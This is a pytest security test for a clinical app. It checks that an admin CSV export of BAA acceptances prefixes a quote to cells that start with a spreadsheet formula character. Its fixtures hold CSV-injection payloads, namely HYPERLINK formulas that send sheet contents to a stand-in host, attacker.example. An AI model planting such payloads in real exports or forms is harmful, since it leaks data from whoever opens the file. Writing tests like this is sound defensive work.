"""Admin BAA CSV export must not emit spreadsheet formulas.

A signed-in clinician can store a practice legal name, signer name, signer
title, User-Agent, and X-Forwarded-For value, and a platform admin can
download every acceptance as CSV. These tests fail while that download
writes a stored value that starts with a formula leader as the cell text.
The safe export keeps the stored text and prefixes one single quote.
"""

import csv
import io
import secrets

import pytest
from fastapi import status
from fastapi.testclient import TestClient

from app.routes import internal
from app.server import api_app

from app.models.baa import (
    BAA_CURRENT_SHA256,
    BAA_CURRENT_VERSION,
    BAA_DOC_ID,
    BaaAcceptance,
)
from app.models.doctor import Doctor
from app.models.practice import PracticeMember
from app.models.superadmin_capability import (
    SuperadminCapabilityEnvironment,
    SuperadminCapabilityKind,
)

from tests.routes.utils import (
    MOCK_CLERK_ISSUER,
    FakeClerkUser,
    FakeEmailAddress,
    get_clerk_admin_user,
    grant_test_superadmin_capability,
)

# Leaders a spreadsheet treats as a formula. Tab and CR cannot begin an
# h11 header value; body fields are stripped before they are stored. A
# leader that remains after that strip is still exported.
_FORMULA_LEADERS = ("=", "+", "-", "@", "\t", "\r")

_HYPERLINK = {
    "legal_name": '=HYPERLINK("https://attacker.example/?d="&TEXTJOIN(",",1,A:J),"x")',
    "signature_name": '+HYPERLINK("https://attacker.example/?n="&E:E,"x")',
    "signature_title": '-HYPERLINK("https://attacker.example/?t="&E:E,"x")',
    "user_agent": '@HYPERLINK("https://attacker.example/?u="&E:E,"x")',
    "forwarded_for": '=HYPERLINK("https://attacker.example/?p="&E:E,"x")',
}
_UNQUOTED = {
    "legal_name": "\t=1+1",
    "signature_name": "+2+2",
    "signature_title": "-3+3",
    "user_agent": "@4+4",
    "forwarded_for": "=5+5",
}
_CARRIAGE_RETURN = {
    "legal_name": "\r=8+8",
    "signature_name": "Casey Owner",
    "signature_title": "Physician / owner",
    "user_agent": "CarriageBrowser/1.0",
    "forwarded_for": "203.0.113.8",
}
_NEIGHBOR = {
    "legal_name": "Harbor Neighbor Practice",
    "signature_name": "Neighbor Owner",
    "signature_title": "Physician / owner",
    "user_agent": "NeighborBrowser/1.0",
    "forwarded_for": "203.0.113.10",
}


def _neutralized(value: str) -> str:
    if value[:1] in _FORMULA_LEADERS:
        return "'" + value
    return value


def _stored(submitted: str, *, strip: bool) -> str:
    return submitted.strip() if strip else submitted


def _stored_forwarded_for(submitted: str) -> str:
    """Match ``_client_ip``: the first hop, not a formula-safe value."""

    return submitted.split(",")[0].strip()


@pytest.fixture(autouse=True)
def _verified_clerk_email_matches_bound_doctor(monkeypatch: pytest.MonkeyPatch) -> None:
    """Keep enrollment offline while preserving the live-identity check."""

    def current_email(clerk_id: str) -> str | None:
        doctor = Doctor.get(clerk_id=clerk_id)
        return (doctor.email or "").strip().lower() if doctor else None

    monkeypatch.setattr(internal, "verified_primary_email", current_email)


def _enable_staging_capabilities(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr(
        "app.services.superadmin_capability.configured_superadmin_capability_environment",
        lambda: SuperadminCapabilityEnvironment.staging,
    )
    monkeypatch.setattr(
        "app.services.superadmin_capability.configured_superadmin_clerk_issuer",
        lambda: MOCK_CLERK_ISSUER,
    )


def _doctor(email: str) -> Doctor:
    return Doctor(
        clerk_id=f"user_csv_formula_{secrets.token_hex(8)}",
        email=email,
        biography="",
    ).save()


def _as(client: TestClient, doctor: Doctor) -> None:
    client.override_user(  # type: ignore[attr-defined]
        FakeClerkUser(
            id=doctor.clerk_id,
            email_addresses=[FakeEmailAddress(email_address=doctor.email or "")],
        )
    )


def _enroll(
    client: TestClient,
    doctor: Doctor,
    fields: dict[str, str],
) -> BaaAcceptance:
    _as(client, doctor)
    legal_name = fields["legal_name"]
    assert 3 <= len(legal_name) <= 160
    assert 2 <= len(fields["signature_name"]) <= 120
    assert 2 <= len(fields["signature_title"]) <= 120
    created = client.post(
        api_app.url_path_for("create_practice"),
        json={
            "legal_name": legal_name,
            "is_solo": True,
            "channel": "direct",
            "pastoral_pack": False,
        },
    )
    assert created.status_code == status.HTTP_200_OK, created.text
    accepted = client.post(
        api_app.url_path_for("accept_practice_baa"),
        json={
            "doc_id": BAA_DOC_ID,
            "version": BAA_CURRENT_VERSION,
            "sha256": BAA_CURRENT_SHA256,
            "signature_name": fields["signature_name"],
            "signature_title": fields["signature_title"],
            "checks": ["baa"],
        },
        headers={
            "User-Agent": fields["user_agent"],
            "X-Forwarded-For": fields["forwarded_for"],
        },
    )
    assert accepted.status_code == status.HTTP_200_OK, accepted.text
    member = PracticeMember.get(doctor_id=doctor.id)
    assert member is not None
    acceptance = BaaAcceptance.get(practice_id=member.practice_id)
    assert acceptance is not None
    assert acceptance.covered_entity_legal_name == _stored(legal_name, strip=True)
    assert acceptance.accepted_by_name == _stored(fields["signature_name"], strip=True)
    assert acceptance.accepted_by_title == _stored(
        fields["signature_title"], strip=True
    )
    assert acceptance.accepted_by_email == doctor.email
    assert acceptance.user_agent == fields["user_agent"]
    stored_ip = _stored_forwarded_for(fields["forwarded_for"])
    assert acceptance.ip_address == stored_ip
    if fields in (_HYPERLINK, _UNQUOTED):
        assert stored_ip[:1] in _FORMULA_LEADERS
    return acceptance


def _csv_rows(client: TestClient) -> list[dict[str, str]]:
    response = client.get(
        api_app.url_path_for("baa_acceptances_export"),
        params={"format": "csv"},
    )
    assert response.status_code == status.HTTP_200_OK, response.text
    assert response.headers["content-type"].startswith("text/csv")
    parsed = list(csv.DictReader(io.StringIO(response.text)))
    assert parsed
    return parsed


def test_baa_acceptance_csv_neutralizes_attacker_controlled_formula_cells(
    bare_authenticated_client: TestClient,
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    _enable_staging_capabilities(monkeypatch)
    planted = {
        "hyperlink": _doctor(f"hyperlink-{secrets.token_hex(4)}@gmail.com"),
        "unquoted": _doctor(f"unquoted-{secrets.token_hex(4)}@gmail.com"),
        "carriage": _doctor(f"carriage-{secrets.token_hex(4)}@gmail.com"),
        "neighbor": _doctor(f"neighbor-{secrets.token_hex(4)}@gmail.com"),
    }
    fields_by_doctor = {
        planted["hyperlink"].id: _HYPERLINK,
        planted["unquoted"].id: _UNQUOTED,
        planted["carriage"].id: _CARRIAGE_RETURN,
        planted["neighbor"].id: _NEIGHBOR,
    }
    acceptances = [
        _enroll(bare_authenticated_client, doctor, fields_by_doctor[doctor.id])
        for doctor in planted.values()
    ]
    by_practice = {record.practice_id: record for record in acceptances}

    _as(bare_authenticated_client, planted["hyperlink"])
    denied = bare_authenticated_client.get(
        api_app.url_path_for("baa_acceptances_export"),
        params={"format": "csv"},
    )
    assert denied.status_code == status.HTTP_403_FORBIDDEN

    _, _, clerk_admin = get_clerk_admin_user()
    admin = Doctor.get(clerk_id=clerk_admin.id)
    assert admin is not None
    assert admin.id not in {doctor.id for doctor in planted.values()}
    grant_test_superadmin_capability(
        admin,
        SuperadminCapabilityKind.platform_admin,
    )
    _as(bare_authenticated_client, admin)
    rows = _csv_rows(bare_authenticated_client)
    by_email = {row["accepted_by_email"]: row for row in rows}

    for acceptance in by_practice.values():
        row = by_email[acceptance.accepted_by_email]
        expected = {
            "practice_legal_name": _neutralized(acceptance.covered_entity_legal_name),
            "accepted_by_name": _neutralized(acceptance.accepted_by_name),
            "accepted_by_title": _neutralized(acceptance.accepted_by_title),
            "accepted_by_email": acceptance.accepted_by_email,
            "ip_address": _neutralized(acceptance.ip_address or ""),
            "user_agent": _neutralized(acceptance.user_agent or ""),
        }
        for field, cell in expected.items():
            assert row[field] == cell, f"{field} exported {row[field]!r}"

    for row in rows:
        for field, cell in row.items():
            assert cell[:1] not in _FORMULA_LEADERS, f"{field} exported {cell!r}"

    hyperlink = by_email[planted["hyperlink"].email or ""]
    neighbor = by_email[planted["neighbor"].email or ""]
    assert "TEXTJOIN" in hyperlink["practice_legal_name"]
    assert "&E:E" in hyperlink["accepted_by_name"]
    assert neighbor["accepted_by_email"] == planted["neighbor"].email
    assert neighbor["practice_legal_name"] == _NEIGHBOR["legal_name"]
    assert hyperlink["practice_legal_name"] != neighbor["practice_legal_name"]

    unquoted = by_email[planted["unquoted"].email or ""]
    assert unquoted["practice_legal_name"] == "'=1+1"
    assert unquoted["user_agent"] == "'@4+4"
    assert unquoted["ip_address"] == "'=5+5"
    carriage = by_email[planted["carriage"].email or ""]
    assert carriage["practice_legal_name"] == "'=8+8"
    assert carriage["user_agent"] == _CARRIAGE_RETURN["user_agent"]
